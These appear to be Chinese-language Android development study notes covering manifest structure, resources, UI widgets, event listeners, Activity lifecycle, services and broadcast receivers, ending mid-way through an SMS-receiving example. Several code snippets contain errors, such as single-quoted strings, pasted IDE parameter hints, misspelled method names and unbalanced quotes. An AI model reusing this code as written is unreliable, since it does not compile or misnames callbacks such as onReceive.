id="配置清单文件-AndroidManifest-xml">配置清单文件(AndroidManifest.xml)</h3><p>AndroidManifest.xml是Android应用程序中最重要的文件之一，它包含了应用程序的基本信息，如应用程序的名称、图标、版本号、权限、组件（Activity、Service、BroadcastReceiver、Content Provider）等等。</p><h4 id="1-manifest标签">1.manifest标签</h4><p>manifest标签是AndroidManifest.xml文件的根标签，它包含了应用程序的基本信息，如包名、版本号、SDK版本、应用程序的名称和图标等等。</p><h4 id="2-application标签">2.application标签</h4><p>application标签是应用程序的主要标签，它包含了应用程序的所有组件，如Activity(活动)、Service(服务)、Broadcast Receiver(广播接收器)、Content  Provider(内容提供者)等等。在application标签中，也可以设置应用程序的全局属性，如主题、权限等等。</p><h4 id="3-activity标签">3.activity标签</h4><p>activity标签定义了一个Activity组件，它包含了Activity的基本信息，如Activity的名称、图标、主题、启动模式等等。在activity标签中，还可以定义Activity的布局、Intent过滤器等等。</p><h4 id="4-service标签">4.service标签</h4><p>service标签定义了一个Service组件，它包含了Service的基本信息，如Service的名称、图标、启动模式等等。在service标签中，还可以定义Service的Intent过滤器等等。</p><h4 id="5-receiver标签">5.receiver标签</h4><p>receiver标签定义了一个BroadcastReceiver组件，它包含了BroadcastReceiver的基本信息，如BroadcastReceiver的名称、图标、权限等等。在receiver标签中，还可以定义BroadcastReceiver的Intent过滤器等等。</p><h4 id="6-provider标签">6.provider标签</h4><p>provider标签定义了一个Content Provider组件，它包含了Content Provider的基本信息，如Content  Provider的名称、图标、权限等等。在provider标签中，还可以定义Content Provider的URI和Mime Type等等。</p><h4 id="7-uses-permission标签">7.uses-permission标签</h4><p>uses-permission标签定义了应用程序需要的权限，如访问网络、读取SD卡等等。在应用程序安装时，系统会提示用户授权这些权限。</p><p>添加sd卡相应权限外 还需要<code>android:requestLegacyExternalStorage=&quot;true&quot;</code></p><h4 id="8-uses-feature标签">8.uses-feature标签</h4><p>uses-feature标签定义了应用程序需要的硬件或软件特性，如摄像头、GPS等等。在应用程序安装时，系统会检查设备是否支持这些特性。</p><h3 id="resources-arsc文件">resources.arsc文件</h3><p>resources.arsc它是一个二进制文件，包含了应用程序的所有资源信息，例如布局文件、字符串、图片等。这个文件在应用程序编译过程中由aapt工具生成，并被打包进APK文件中。</p><p>resources.arsc文件的主要作用是提供资源的索引和映射关系。应用程序通常是通过资源 ID在这个资源映射表中寻找对应的资源。当应用程序运行时，系统会根据R类中的ID来查找对应的资源，并将其加载到内存中，供应用程序使用。这个过程是通过解析resources.arsc文件和R类实现的。通过这种方式，应用程序可以方便地访问和使用资源，而不需要手动处理资源文件的位置和命名等问题。</p><h3 id="res文件夹">res文件夹</h3><p>res文件夹，存放的也是资源文件，与assets文件夹不同的是，这里是编译后的资源文件。res的每个子文件夹用来存放特定类型的资源文件。在Android应用程序开发中，资源文件通常是以XML格式存储的，如布局文件、字符串资源、颜色资源等。</p><h4 id="drawable-文件夹">drawable 文件夹</h4><p>用来存放图片资源文件，包括位图文件（.png, .jpg, .gif 等）和矢量图文件（.svg）。</p><h4 id="layout文件夹">layout文件夹</h4><p>用来存放布局文件，布局文件用来描述应用程序的界面结构。</p><h4 id="values-文件夹">values 文件夹</h4><p>来存放值资源文件，值资源文件用来存放应用程序中使用的常量值和颜色信息。</p><p>当想要手机内容和系统语言一致使，创建一个valuse-zh/values-en</p><h4 id="classes-dex文件">classes.dex文件</h4><p>它是应用程序的可执行文件。它是一个被编译过的DEX（Dalvik Executable）文件，是Dalvik虚拟机的格式，用于在Android设备上运行Java应用程序。</p><h2 id="常用的UI组件">常用的UI组件</h2><p>TextView–文本显示组件</p><p>EditView–文本编辑组件，继承自TextView组件</p><p>Button–按钮</p><p>CheckBox &amp;&amp; RadioButton–复选框和单选框，继承自Button类。其中RadioButton是单选按钮必须编制到RadioGroup中，同一时刻只有一个可以被选中。</p><p>ListView–列表组件</p><p>Spinner–下拉列表组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_test);</span><br><span class="line">button.setText(<span class="string">&#x27;Button&#x27;</span>); <span class="comment">//设置button组件的内容为‘button’</span></span><br><span class="line"></span><br><span class="line"><span class="type">TextView</span> <span class="variable">textview</span> <span class="operator">=</span> findViewById(R.id.textView_test);</span><br><span class="line">textview.setText(<span class="string">&#x27;text&#x27;</span>); <span class="comment">//设置文本框内容为&#x27;text&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">EditText</span> <span class="variable">edittext</span> <span class="operator">=</span>  findViewById(R.id.editTextTextPassword);</span><br><span class="line">edittext.setHint(<span class="string">&#x27;请输入密码&#x27;</span>) <span class="comment">//设置用户编辑框中提示‘请输入密码’，当用户输入时就消失</span></span><br><span class="line"> </span><br><span class="line"><span class="type">RadioGroup</span> <span class="variable">radiogroup</span> <span class="operator">=</span> findViewById(R.id.radioGroup);</span><br><span class="line">radiogroup.check(R.id.radioButton); <span class="comment">//  RadioGroup中选择一个单选框</span></span><br><span class="line"></span><br><span class="line"><span class="type">AdapterView</span> <span class="variable">spinner</span> <span class="operator">=</span> find <span class="title function_">ViewById</span><span class="params">(R.id.spinner)</span>; <span class="comment">//列表类控件,使用AdapterView类，这样可以方便切换Spinner和ListView，只需要改R.layout_item标签头就可以</span></span><br><span class="line"><span class="comment">//数组数据适配器</span></span><br><span class="line"><span class="comment">//创建数据适配器对象</span></span><br><span class="line">String []data = &#123;<span class="string">&#x27;Item1&#x27;</span>,<span class="string">&#x27;Item2&#x27;</span>,<span class="string">&#x27;Item3&#x27;</span>&#125;; <span class="comment">//下拉列表的数据，为String型 所以下面是&lt;String&gt;</span></span><br><span class="line">ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> <span class="title class_">ArrayAdapter</span>&lt;String&gt;(context <span class="built_in">this</span>, </span><br><span class="line">                                                        R.layout_item(布局文件，控制下拉列表每一行的样子),</span><br><span class="line">                                                        R.id.textview_msg(文本框id),</span><br><span class="line">                                                        data);</span><br><span class="line">spinner.setAdapter(adapter); <span class="comment">//下拉列表加载对象 </span></span><br><span class="line"><span class="comment">//使用简单适配器可以使每个下拉列表图片和数据不一样</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安卓事件处理模型">安卓事件处理模型</h2><h3 id="基于多态机制的事件处理">基于多态机制的事件处理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当屏幕被触摸时该方法被调用 event为触摸事件</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouchEvent</span><span class="params">(MotionEvent event)</span>;</span><br><span class="line"><span class="comment">//当键盘被按下时该方法被调用 keycode为按键码 event为按键事件</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyUp</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>;</span><br><span class="line"><span class="comment">//当键盘被弹起时该方法被调用 keycode为按键码 event为按键事件</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值为true时，表示已经完整的处理了事件，其他回调方法不会在处理该事件</span></span><br><span class="line"><span class="comment">//返回值为false时，表示被没有完全处理完事件，其他回调方法会继续对该事件进行处理</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event.getPointerCount();  <span class="comment">//获取坐标数量 </span></span><br></pre></td></tr></table></figure><h3 id="基于监听接口的事件处理">基于监听接口的事件处理</h3><p>处理多态的不可维护性</p><ul><li><p>事件接口</p></li><li><p>View.OnClickListener ===&gt; 单击事件接口</p></li></ul><p>​        当用户触摸这个item（在触摸模式下），或者通过浏览键或跟踪球聚焦在这个item上，然后按下“确认”键或者按下跟踪球时被调用。</p><ul><li><p>View.OnCreateContextMenuListener ===&gt; 菜单事件接口                                                                                   当正在创建一个上下文菜单的时候被调用（作为持续的“长点击”动作的结果）。</p></li><li><p>View.OnFocusChangeListener ===&gt; 焦点改变事件<br>当用户使用浏览键或跟踪球浏览进入或离开这个item时被调用</p></li><li><p>View.OnKeyListener ===&gt; 按键事件接口<br>当用户聚焦在这个item上并按下或释放设备上的一个按键时被调用。</p></li><li><p>View.OnLongClickListener ===&gt; 长按事件接口<br>当用户触摸并控制住这个item（在触摸模式下），或者通过浏览键或跟踪球聚焦在这个item上，然后保持按下“确认”键或者按下跟踪球（一秒钟）时被调用。</p></li><li><p>View.OnTouchListener ===&gt; 触屏事件接口<br>当用户执行的动作被当做一个触摸事件时被调用，包括按下，释放，或者屏幕上任何的移动手势（在这个item的边界内）。</p></li><li><p>举个例子，写一个简单的单击事件监听器</p></li><li><p>重写监听器</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClickListen</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">        Log.d(tag:<span class="string">&quot;51asm&quot;</span>,msg:<span class="string">&quot;button1 click&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注册监听器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">MyClickListen</span>());</span><br></pre></td></tr></table></figure><p>当点击绑定的按钮就会调用MyClickListen方法</p><ul><li>匿名类实现监听器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TextView mTextView;</span><br><span class="line">mTextView = findViewById(R.id.textview);</span><br><span class="line">  </span><br><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span>findViewById(R.id.button);  </span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">        Lod.g(tag:<span class="string">&quot;51asm&quot;</span>,msg:<span class="string">&quot;MainActivity$1 button click&quot;</span>);</span><br><span class="line">        mTextView.setText(<span class="string">&quot;&quot;</span>MainActivity$<span class="number">1</span> button<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">   </span></span><br></pre></td></tr></table></figure><h3 id="基于系统设置的事件处理">基于系统设置的事件处理</h3><p>Configuration类</p><p>Configuration类专门用于扫描手机设备上的配置信息</p><p>获取系统设置信息</p><p>Resources类的getConfiguration方法，可以获取系统设置对象</p><p>Resources对象，可以通过Activity的getResources方法获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> getResources().getConfiguration();</span><br><span class="line">    <span class="keyword">if</span>(config.orientation == Configuration.ORIENTATION_LANDSCAPE)&#123;</span><br><span class="line">        Toast.makeText(context:<span class="built_in">this</span>,text:<span class="string">&quot;横屏&quot;</span>，Toast.LENGTH_LONG).show(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Toast.makeText(context:<span class="built_in">this</span>,text:<span class="string">&quot;纵屏&quot;</span>，Toast.LENGTH_LONG).show(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Android启动流程image-20231024163626871">Android启动流程<img src="assets/image-20231024163626871.png" alt="image-20231024163626871"></h2><h2 id="Android四大组件">Android四大组件</h2><h3 id="Activity">Activity</h3><ul><li>Activity是一个UI容器，可以包含任意的用户接口元素，如按钮，文本框等。</li><li>Activity提供了和用户交互的可视化界面</li><li>Activity之间可以通过消息的方式互相跳转和传输数据</li><li>要使应用能够使用Activity，必须在配置清单中声明Activity及其特定属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//启动一个新界面</span></span><br><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_new);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//启动新的Activity</span></span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, NewActivity.class);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Action和category的值可以自定义，Android系统也提供了许多预定义的常量值，用于启动系统预定义的Activity、Service。<img src="assets/image-20231021214934063.png" alt="image-20231021214934063"></p><p>Intent类中与Category相关的常量值列表<img src="assets/image-20231021214955497.png" alt="image-20231021214955497"></p><p>Intent类中与Action相关的常量列表清单文件中，intent-filter之间的为主界面，.LAUNCHER为图标</p><p><img src="assets/image-20231021214219019.png" alt="image-20231021214219019"></p><h4 id="Activity生命周期">Activity生命周期</h4><p>一个Activity在其生命周期中会经历多种状态，可以使用一系列回调来处理状态之间的转换<img src="assets/image-20231022162550221.png" alt="image-20231022162550221"></p><p>onCreate()：表示Activity正在被创建，做一些activity初始化工作</p><p>onStart()：Activity由不可见变为可见的时候调用。此时activity是用户可见状态，但未出现在前台。没有焦点，不能与用户交互。</p><p>onResume()：Activity准备好和用户进行交互的时候调用。此时Activity一定位于任务栈的栈顶，并且处于运行状态，可与用户进行交互。</p><p>onPause()：系统准备去启动或恢复另一个Activity的时候调用。当另外一个activity覆盖当前acitivty时，当前activity会进入到onPause()方法中，当前activity是可见的，但不能与用户交互状态。</p><p>onStop()：Activity完全不可见的时候调用。此时activity对用户是不可见的。</p><p>onDestroy()：activity被销毁之前进行调用 ，activity生命周期最后一个回调，这里可以做一些回收工作，资源释放。</p><p>onRestart()：Activity由停止状态变为运行状态的时候调用，也就是activity被重新启动了。</p><h4 id="手机中按退出时进行确定弹窗：是否确定退出">手机中按退出时进行确定弹窗：是否确定退出</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyCode == KeyEvent.KEYCODE_BACK)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(<span class="built_in">this</span>)</span><br><span class="line">            .setTitle(<span class="string">&quot;51asm&quot;</span>)</span><br><span class="line">            .setIcon(R.mipmap.ic_launcher)</span><br><span class="line">            .setMessage(<span class="string">&quot;你是否真的要退出程序？&quot;</span>)</span><br><span class="line">            .setPositiveButton(<span class="string">&quot;确定&quot;</span>，<span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListenter()&#123;</span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog,<span class="type">int</span> which)</span>&#123;</span><br><span class="line">                    finish(); <span class="comment">//销毁activity</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .setNegativeButton(<span class="string">&quot;取消&quot;</span>，<span class="literal">null</span>)</span><br><span class="line">            .create()</span><br><span class="line">            .show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.onKeyDown(keyCode,event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态生成Fragmentimage-20231022165305482">动态生成Fragment<img src="assets/image-20231022165305482.png" alt="image-20231022165305482"></h4><h3 id="Service">Service</h3><h4 id="概念">概念</h4><ul><li>一种可在后台执行长时间运行操作而不提供界面的应用组件</li><li>使用服务时，需要在配置文件中声明，<service android:name=".类名 "/></li></ul><h4 id="简单消息处理">简单消息处理</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_start&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;start&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_stop&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;stop&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_bind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;bind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_unbind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;unbind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>注册完按钮后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_start);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_stop);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_bind);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_unbind);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,MyCountService.class);</span><br><span class="line">    <span class="keyword">switch</span>(v.getId())&#123;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_start: <span class="comment">//启动服务</span></span><br><span class="line">            startService(intent);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_stop:</span><br><span class="line">            stopService(intent);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_bind:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_unbind:</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BroadcastReceiver广播接收器">BroadcastReceiver广播接收器</h3><p>Android系统中的Broadcast Intent</p><ul><li>网络状态变化：android.net.conn.CONNECTIVITY_CHANGE</li><li>系统启动成功：android.intent.action.BOOT_COMPLETED</li><li>电池电量变化：android.intent.action.BATTERY_CHANGED</li><li>充电：android.intent.action.ACTION_POWER_CONNECTED,android.intent.action.ACTION_POWER_DISCONNECTED</li><li>收到短信：android.provider.Telephony.SMS_RECEIVED</li></ul><h4 id="简单的例子">简单的例子</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_send);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//发送广播 </span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;www.xxx.com&quot;</span>);</span><br><span class="line">        sendBroadcast(intent);   <span class="comment">//无序广播</span></span><br><span class="line">        sendOrderedBroadcast(intent，<span class="literal">null</span>) <span class="comment">//有序广播 第二个参数是权限，对应要在配置文件中添加(静态)   </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//注册广播听众 1.动态注册 2.静态注册</span></span><br><span class="line"><span class="comment">//动态注册</span></span><br><span class="line"><span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">filter.addAction(<span class="string">&quot;www.xxx.com&quot;</span>);</span><br><span class="line">registerReceiver(<span class="keyword">new</span> <span class="title class_">MyReceiver</span>(),filter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态注册</span></span><br><span class="line">配置文件中添加(无序)</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.MyReceiver&quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;www.xxx.com&quot;</span>/&gt;</span><br><span class="line">         &lt;/intent-filter&gt;</span><br><span class="line">    &lt;/receiver&gt;</span><br><span class="line">                </span><br><span class="line">配置文件中添加(有序)</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.MyReceiver&quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter android:priority=<span class="string">&quot;5&quot;</span>&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;www.xxx.com&quot;</span>/&gt;</span><br><span class="line">         &lt;/intent-filter&gt;</span><br><span class="line">    &lt;/receiver&gt;              </span><br><span class="line">                </span><br><span class="line"><span class="comment">//新建一个类 MyReceiver 听众</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiver</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;onReceiver&quot;</span>);    </span><br><span class="line">        abortBroadcast(); <span class="comment">//终止广播 低版本安卓一个简单漏洞 高版本安卓系统已经修复</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="短信的广播">短信的广播</h4><p>获得短信内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//静态注册</span></span><br><span class="line">配置文件中添加(无序)</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span>/&gt;</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.SmsReceiver &quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;android.provider.Telephony.SMS_RECEIVED/&gt;</span></span><br><span class="line"><span class="string">         &lt;/intent-filter&gt;</span></span><br><span class="line"><span class="string">    &lt;/receiver&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">//新建一个类 SmsReceiver</span></span><br><span class="line"><span 